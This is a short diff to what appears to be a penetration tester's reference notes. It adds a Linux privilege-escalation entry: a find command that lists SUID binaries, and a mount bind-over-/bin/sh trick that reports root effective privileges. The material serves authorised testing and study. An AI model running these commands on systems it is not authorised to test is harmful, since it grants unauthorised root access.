@@ -2607,7 +2607,11 @@ Reference
       su root2
       id
       ```
-  - ddd
+  - SUID binaries [bin/mount](https://gtfobins.github.io/gtfobins/mount/)
+    - listing the SUID binaries > /bin/mount  
+      `find / -perm -u=s -type f 2>/dev/null`  
+    - Exploit mount > euid=0(root) 
+      `mount -o bind /bin/sh /bin/mount` `id`  
 
 ## Penetration testing report 
 - note editor:
